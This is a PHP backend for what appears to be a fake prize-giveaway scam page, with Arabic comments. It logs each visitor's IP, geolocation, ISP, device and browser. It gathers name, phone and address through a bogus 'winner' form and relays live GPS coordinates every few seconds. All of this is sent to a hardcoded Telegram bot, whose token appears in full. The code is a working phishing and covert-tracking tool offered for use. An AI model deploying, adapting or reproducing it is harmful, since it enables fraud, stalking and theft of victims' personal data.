<?php
// ==============================================
// 1. إعدادات قاعدة البيانات (Hostinger)
// ==============================================
$host = 'localhost'; // أو عنوان الخادم من Hostinger
$dbname = 'اسم_قاعدة_البيانات';
$username = 'اسم_المستخدم';
$password = 'كلمة_المرور';

try {
    $pdo = new PDO("mysql:host=$host;dbname=$dbname;charset=utf8", $username, $password);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    // إنشاء الجدول إذا لم يكن موجوداً
    $pdo->exec("CREATE TABLE IF NOT EXISTS visitors (
        id INT AUTO_INCREMENT PRIMARY KEY,
        ip VARCHAR(45) NOT NULL,
        location TEXT,
        device TEXT,
        browser TEXT,
        name VARCHAR(255),
        phone VARCHAR(50),
        address TEXT,
        prize INT,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )");
} catch (PDOException $e) {
    die("خطأ في قاعدة البيانات: " . $e->getMessage());
}

// ==============================================
// 2. إعدادات بوت التليجرام
// ==============================================
define('TELEGRAM_BOT_TOKEN', '8954676427:AAGpFVLe-bwwB9tcrv5anWo1CRVVCknaycE');
define('TELEGRAM_CHAT_ID', '5349663021'); // معرف المجموعة

// ==============================================
// 3. دوال مساعدة
// ==============================================
function getRealIP() {
    $ip = $_SERVER['REMOTE_ADDR'];
    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
    elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) $ip = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    return trim($ip);
}

function getGeolocation($ip) {
    $url = "http://ip-api.com/json/{$ip}?fields=status,country,city,lat,lon,isp,proxy";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    $response = curl_exec($ch);
    curl_close($ch);
    if ($response) return json_decode($response, true);
    return null;
}

function sendToTelegram($message) {
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    $data = ['chat_id' => TELEGRAM_CHAT_ID, 'text' => $message, 'parse_mode' => 'HTML'];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_exec($ch);
    curl_close($ch);
}

function sendLocationToTelegram($lat, $lng) {
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendLocation";
    $data = ['chat_id' => TELEGRAM_CHAT_ID, 'latitude' => $lat, 'longitude' => $lng];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_exec($ch);
    curl_close($ch);
}

// ==============================================
// 4. معالجة الطلبات القادمة من Frontend
// ==============================================
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    if (!$input) $input = $_POST; // للتوافق مع FormData

    $ip = getRealIP();
    $geo = getGeolocation($ip);
    $device = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    $browser = 'Unknown';
    if (strpos($device, 'Chrome') !== false) $browser = 'Chrome';
    elseif (strpos($device, 'Firefox') !== false) $browser = 'Firefox';
    elseif (strpos($device, 'Safari') !== false) $browser = 'Safari';

    $location = ($geo && $geo['status'] === 'success') ? "{$geo['city']}, {$geo['country']}" : 'Unknown';
    $lat = $geo['lat'] ?? null;
    $lng = $geo['lon'] ?? null;
    $isp = $geo['isp'] ?? 'Unknown';
    $isProxy = ($geo['proxy'] ?? false) ? 'نعم' : 'لا';

    // تخزين في قاعدة البيانات
    $stmt = $pdo->prepare("INSERT INTO visitors (ip, location, device, browser) VALUES (?, ?, ?, ?)");
    $stmt->execute([$ip, $location, $device, $browser]);
    $visitorId = $pdo->lastInsertId();

    // إرسال البيانات الأولية للتليجرام
    $msg = "🔔 <b>زائر جديد</b>\n";
    $msg .= "🕐 الوقت: " . date('Y-m-d H:i:s') . "\n";
    $msg .= "🌐 IP: {$ip}\n";
    $msg .= "📍 الموقع: {$location}\n";
    $msg .= "🛡️ بروكسي/VPN: {$isProxy}\n";
    $msg .= "💻 الجهاز: {$device}\n";
    $msg .= "🌍 المتصفح: {$browser}\n";
    $msg .= "📡 مزود الخدمة: {$isp}\n";
    sendToTelegram($msg);

    if ($lat && $lng) {
        sendLocationToTelegram($lat, $lng);
    }

    // معالجة بيانات النموذج (الاسم، الجوال، العنوان)
    if (isset($input['name']) || isset($input['phone']) || isset($input['address'])) {
        $name = $input['name'] ?? '';
        $phone = $input['phone'] ?? '';
        $address = $input['address'] ?? '';
        $prize = rand(50, 2000);

        // تحديث السجل في قاعدة البيانات
        $stmt = $pdo->prepare("UPDATE visitors SET name = ?, phone = ?, address = ?, prize = ? WHERE id = ?");
        $stmt->execute([$name, $phone, $address, $prize, $visitorId]);

        // رسالة الجائزة للتليجرام
        $prizeMsg = "🎉 <b>فائز بجائزة!</b> 🎉\n";
        $prizeMsg .= "👤 الاسم: {$name}\n";
        $prizeMsg .= "📞 الجوال: {$phone}\n";
        $prizeMsg .= "📍 العنوان: {$address}\n";
        $prizeMsg .= "💰 الجائزة: $ {$prize}\n";
        $prizeMsg .= "📱 iPhone أحدث إصدار\n";
        $prizeMsg .= "🚗 سيارة فاخرة\n";
        $prizeMsg .= "✅ سيتم التواصل معك قريباً";
        sendToTelegram($prizeMsg);
    }

    // تحديث الموقع الحي (كل 3 ثواني)
    if (isset($input['lat']) && isset($input['lng'])) {
        $lat = $input['lat'];
        $lng = $input['lng'];
        sendLocationToTelegram($lat, $lng);
        $locMsg = "📍 <b>تحديث موقع حي</b>\n";
        $locMsg .= "🌐 IP: {$ip}\n";
        $locMsg .= "🗺️ https://www.google.com/maps?q={$lat},{$lng}";
        sendToTelegram($locMsg);
    }

    // الرد بنجاح
    header('Content-Type: application/json');
    echo json_encode(['status' => 'success', 'id' => $visitorId]);
    exit;
}
?>
